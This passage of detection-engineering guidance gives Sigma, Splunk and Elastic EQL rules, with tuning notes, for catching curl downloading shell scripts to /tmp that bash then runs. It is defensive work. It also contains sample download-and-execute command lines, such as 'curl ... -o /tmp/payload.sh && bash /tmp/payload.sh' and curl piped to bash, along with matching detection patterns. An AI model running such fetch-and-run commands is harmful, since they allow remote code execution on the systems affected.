      - 'curl'
  selection_tmp_path:
    CommandLine|contains:
      - '/tmp/'
      - '/var/tmp/'
      - '/dev/shm/'
  selection_output_flag:
    CommandLine|re: '(?i)(?:-o|--output)[=\s]+'
  selection_script_path:
    CommandLine|re: '(?i)(?:/tmp/|/var/tmp/|/dev/shm/)[\w.\-/]+(?:\.sh|\.bash)\b'
  selection_redirect:
    CommandLine|re: '>[^;|&]*\s*(?:/tmp/|/var/tmp/|/dev/shm/)[\w.\-/]+(?:\.sh|\.bash)\b'
  condition: selection_curl and selection_tmp_path and ((selection_output_flag and selection_script_path) or selection_redirect)
falsepositives:
  - Legitimate software installers
  - Administrative scripts
  - CI/CD pipelines
  - Package manager hooks
  - Application deployment scripts
level: medium
```

Example behavior detected by this rule:

```bash
curl https://example.com/install.sh -o /tmp/install.sh
curl --output /tmp/install.sh https://example.com/install.sh
curl https://example.com/install.sh > /tmp/install.sh
```

---

## Rule 2: Bash Executes Script From Temporary Path

```yaml
title: Bash Executes Script From Temporary Path
id: 72a2b774-99e2-4a93-91c9-b8798d36e851
status: experimental
description: >
  Detects bash executing a Bash script from /tmp, /var/tmp, or /dev/shm.
  When preceded by curl downloading the script, this indicates download-and-execute behavior.
author: "Detection Engineering"
date: 2026-06-15
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command-and-scripting-interpreter
  - attack.t1059.004
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: linux
detection:
  selection_bash:
    Image|endswith:
      - '/bash'
      - 'bash'
      # Optional: include sh if your environment sometimes launches scripts via /bin/sh
      # - '/sh'
      # - 'sh'
  selection_command:
    CommandLine|re: '(?i)(?:^|[\s;|&])(?:bash|/bin/bash|/usr/bin/bash)\s+(?:-\S+\s+)*(?:/tmp/|/var/tmp/|/dev/shm/)[\w.\-/]+(?:\.sh|\.bash)\b'
  condition: selection_bash and selection_command
falsepositives:
  - Administrative scripts placed in /tmp
  - Application installers
  - Development or build scripts
level: medium
```

Example behavior detected by this rule:

```bash
bash /tmp/install.sh
/usr/bin/bash /tmp/payload.sh
/bin/bash /tmp/script.bash
```

---

# Single-Event Variant: Chained Curl + Bash Command

Many attacks chain download and execution inside one shell command, for example:

```bash
sh -c "curl https://example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

This can be detected directly as a single process-creation event.

```yaml
title: Chained Curl Download And Bash Execution From /tmp
id: 37d2c3f5-6f47-4d6f-8e09-f5e879d9e0c1
status: experimental
description: >
  Detects a shell command chain that uses curl to download a Bash script to /tmp and immediately executes it with bash.
author: "Detection Engineering"
date: 2026-06-15
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.command-and-scripting-interpreter
  - attack.t1059.004
  - attack.t1105
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/sh'
      - '/bash'
      - 'sh'
      - 'bash'
  selection_chained:
    CommandLine|re: '(?i)curl[^\n]*(?:-o|--output)[=\s]+(?:/tmp/|/var/tmp/|/dev/shm/)[\w.\-/]+\.sh[^\n]*(?:&&|;|\|)[^\n]*(?:bash|sh)\s+(?:-\S+\s+)*(?:/tmp/|/var/tmp/|/dev/shm/)[\w.\-/]+\.sh'
  selection_pipe:
    CommandLine|re: '(?i)curl[^\n]*https?://[^\s]+\.sh[^\n]*\|\s*(?:bash|sh)\b'
  condition: selection_image and (selection_chained or selection_pipe)
falsepositives:
  - Legitimate installers using curl | bash patterns
  - Administrative setup scripts
level: high
```

This single rule can produce higher-confidence alerts when the command line contains both the download and execution, but it may miss cases where curl and bash happen as separate processes.

---

# Splunk Correlation Rule Example

Use this when you have process-creation data with `process_name` or `Image` and `command_line`.

```spl
index=* sourcetype=process* OR sourcetype=sysmon* OR sourcetype=linux*
  (process_name="*curl*" command_line="*/tmp/*.sh*")
  OR
  (process_name="*curl*" command_line="*/tmp/*.bash*")
  OR
  (process_name="*bash*" command_line="*/tmp/*.sh*")
  OR
  (process_name="*bash*" command_line="*/tmp/*.bash*")
  OR
  (process_name="*sh*" command_line="*/tmp/*.sh*")
  OR
  (process_name="*sh*" command_line="*/tmp/*.bash*")
| rex command_line="(?<script>/tmp/[^\s;|&]+\.(?:sh|bash))"
| eval curl_download = 
    match(process_name, "(?i).*curl.*") AND 
    match(command_line, "(?i)(?:-o|--output)[=\s]+[^\s;|&]*\/tmp\/[\w.\-\/]+\.(?:sh|bash)\b|>[^;|&]*\s*\/tmp\/[\w.\-\/]+\.(?:sh|bash)\b")
| eval bash_exec = 
    match(process_name, "(?i).*(bash|sh).*") AND 
    match(command_line, "(?i)(?:bash|sh|/bin/bash|/usr/bin/bash|/bin/sh|/usr/bin/sh)\s+(?:-\S+\s+)*\/tmp\/[\w.\-\/]+\.(?:sh|bash)\b")
| search (curl_download=true OR bash_exec=true) AND isnotnull(script)
| transaction host, script maxspan=5m startswith="curl_download=true" endswith="bash_exec=true"
| stats min(_time) as curl_time max(_time) as bash_time count as events by host, script
| eval duration_seconds = bash_time - curl_time
| where curl_time < bash_time AND duration_seconds <= 300
```

Adjust field names depending on your data:

- `process_name` might be `Image`, `process.image`, or `executable`.
- `command_line` might be `CommandLine`, `process.command_line`, or `args`.
- `host` might be `host`, `Computer`, `src`, or `hostname`.

---

# Elastic EQL Correlation Rule Example

Use EQL if you are running Elasticsearch/Elastic Security with process-start events.

```eql
sequence by host.id with maxspan=5m
  [process where event.action == "start" and process.executable =~ ".*/curl$" and (
      process.command_line =~ "(?i)(?:-o|--output)[=\\s]+(?:/tmp/|/var/tmp/|/dev/shm/)[\\w./\\-]+\\.(?:sh|bash)\\b"
      OR
      process.command_line =~ "(?i)>[^;|&]*\\s*(?:/tmp/|/var/tmp/|/dev/shm/)[\\w./\\-]+\\.(?:sh|bash)\\b"
  )]
  [process where event.action == "start" and process.executable =~ ".*/bash$" and (
      process.command_line =~ "(?i)(?:bash|/bin/bash|/usr/bin/bash)\\s+(?:-\\S+\\s+)*(?:/tmp/|/var/tmp/|/dev/shm/)[\\w./\\-]+\\.(?:sh|bash)\\b"
  )]
```

If your EDR exposes `process.args` rather than `process.command_line`, you can tune the query to inspect individual arguments for `-o`, `--output`, `/tmp/...sh`, and `bash /tmp/...sh`.

---

# Correlation Rule Settings

For best fidelity, correlate using:

```text
Correlation Key:
  host.id + extracted_script_path

Script Path Regex:
  /tmp/[^\s;|&]+\.(?:sh|bash)

Time Window:
  0 - 5 minutes
  Recommended starting point: 60 - 300 seconds

Severity:
  Medium without script-path matching
  High when both events contain the same /tmp script path
```

If the same script path appears in both events:

```bash
curl https://example.com/x.sh -o /tmp/x.sh
bash /tmp/x.sh
```

then the detection becomes high-confidence.

If only host and time match, but script paths are not extracted or do not match, keep the alert but lower the confidence.

---

# Optional Enhancement: Include File-Write Events

Command-line correlation may miss cases where the shell writes the file through redirection, file handles, or indirect invocation. If your EDR provides file-write events, add a third event:

```text
Event A:
  curl process creation
  Command line references /tmp/*.sh or /tmp/*.bash

Event B:
  FileCreate / FileWrite event where:
    file.path matches /tmp/*.sh
    source process is curl, bash, or a child of curl
    action is write or create

Event C:
  bash process creation
  Command line contains /tmp/*.sh
```

Correlate:

```text
curl write /tmp/script.sh followed by bash /tmp/script.sh
```

This can improve reliability over command-line matching alone.

---

# Detection Tuning Notes

This rule pattern can detect common malware delivery techniques such as:

```bash
curl https://example.com/install.sh -o /tmp/install.sh
bash /tmp/install.sh
```

```bash
curl https://example.com/payload.sh > /tmp/payload.sh
chmod +x /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
sh -c "curl https://example.com/x.sh -o /tmp/x.sh && bash /tmp/x.sh"
```

```bash
curl https://example.com/x.sh | bash -s -- --install-dir=/tmp
```

To reduce false positives:

- Exclude known application installers, update agents, container tooling, and deployment scripts.
- Exclude paths used by legitimate package managers or CI/CD runners.
- If you operate Kubernetes, Docker, Jenkins, GitLab Runner, Ansible, or similar automation, create host or process-level allow lists.
- Prefer correlating the exact script path, not just the `/tmp` folder.
- If your environment supports process ancestry, require:
  - `bash` parent chain includes `curl`, or
  - `bash` is a child of `sh` or `bash` whose command line contains both `curl` and `/tmp/*.sh`.

Recommended final alert name:

```text
Malicious Download and Execute: Curl Downloaded Bash Script to /tmp Followed by Bash Execution
```
